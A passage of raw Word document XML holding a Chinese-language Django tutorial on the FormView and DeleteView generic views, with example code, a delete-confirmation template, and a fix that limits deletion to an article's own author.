        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    def form_valid(self, form):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A22CE7E" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">       form.do_sth()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5198D81C" w14:textId="4E472352" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">       return super().form_valid(form)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FA77AA4" w14:textId="4458791C" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0718E8EE" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django通用视图之FormView</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61ACB5F8" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>FormView一般用来展示某个表单，而不是某个模型对象。当用户输入信息未通过表单验证，显示错误信息。当用户输入信息通过表单验证提交成功后，转到其它页面。使用FormView一般需要定义template_name, form_class和跳转的success_url.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39CDDE2F" w14:textId="3C1187E6" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="29D18AEA" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>见下面代码。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="096098F3" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># views.py - Use FormView</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C9DB06E" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from myapp.forms import ContactForm</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="428F76E0" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.views.generic.edit import FormView</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1822174C" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5071BFB4" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>class ContactView(FormView):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0506548F" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    template_name = 'contact.html'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5250CDAA" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    form_class = ContactForm</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65344F5B" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    success_url = '/thanks/'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6836A0B4" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6E830F50" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    def form_valid(self, form):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BED097D" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        # This method is called when valid form data has been POSTed.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09773A8A" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        # It should return an HttpResponse.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="232D6F76" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        form.send_email()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66CB04AD" w14:textId="3E0D66CC" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        return super().form_valid(form)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="157F609A" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="52A9C22B" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django通用视图之DeleteView</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="558ADDBC" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>DeleteView一般用来删除某个具体对象。它要求用户点击确认后再删除一个对象。使用这个通用视图，你需要定义模型的名称model和成功删除对象后的返回的URL。默认模板是myapp/model_confirm_delete.html。默认内容对象名字是model_name,本例中为article。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B6967A3" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="25B9B919" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>本例使用了默认的模板blog/article_confirm_delete.html，删除文章后通过reverse_lazy方法返回到index页面。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="745CCAF9" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.urls import reverse_lazy</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="046FDB6E" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.views.generic.edit import DeleteView</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E3F4B5A"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6C36D28D" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="223F4BCC" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>class ArticleDeleteView(DeleteView):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B71C5E8" w14:textId="77777777"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60FEC899" w14:textId="714B93CB" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    success_url = reverse_lazy('index')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29629197" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>模板内容如下:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79647BA2" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># blog/article_confirm_delete.html</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4441A3F9" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&lt;form method="post"&gt;{% csrf_token %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18819161" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    &lt;p&gt;Are you sure you want to delete "{{ article }}"?&lt;/p&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1518B382" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    &lt;input type="submit" value="Confirm" /&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="457818EF" w14:textId="3DB2F2C8" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>&lt;/form&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B6162D1" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>但这段代码还有个问题，你注意到没? 用户可以删除任意文章，包括别人发表的文章。如果我们想用户只能删除自己的文章，上述代码怎么改? 我们通过get_queryset方法筛选出作者自己的文章即可。views.py可改成下文:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1629ACB6" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.urls import reverse_lazy</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="695B36F8" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.views.generic.edit import DeleteView</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47F1DE51"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57ABC334" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="24B3BC85" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>class ArticleDeleteView(DeleteView):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18572E12" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    model = Article</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06EA37D5" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    success_url = reverse_lazy('index')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B4BB8BF" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="20CF1425" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    def get_queryset(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="193D7B07" w14:textId="595C9820" w:rsidR="00995934" w:rsidRPr="00B96C81" w:rsidRDefault="00995934" w:rsidP="00B96C81">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        return self.model.objects.filter(author=self.request.user)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10EAD55C" w14:textId="0C6C8C40" w:rsidR="001C47AF" w:rsidRDefault="00995934" w:rsidP="00995934">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013</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:b/>
          <w:color w:val="4D4D4D"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="27"/>
          <w:u w:color="B4C6E7" w:themeColor="accent1" w:themeTint="66"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:hyperlink r:id="rId244" w:anchor="wechat_redirect" w:history="1">
        <w:r w:rsidR="001C47AF" w:rsidRPr="00995934">
          <w:rPr>
            <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
            <w:b/>
            <w:color w:val="4D4D4D"/>
            <w:sz w:val="30"/>
            <w:szCs w:val="27"/>
            <w:u w:color="B4C6E7" w:themeColor="accent1" w:themeTint="66"/>
          </w:rPr>
          <w:t>Django基础核心技术介绍(4): Template模板的编写及过滤器</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="2AD578C4" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
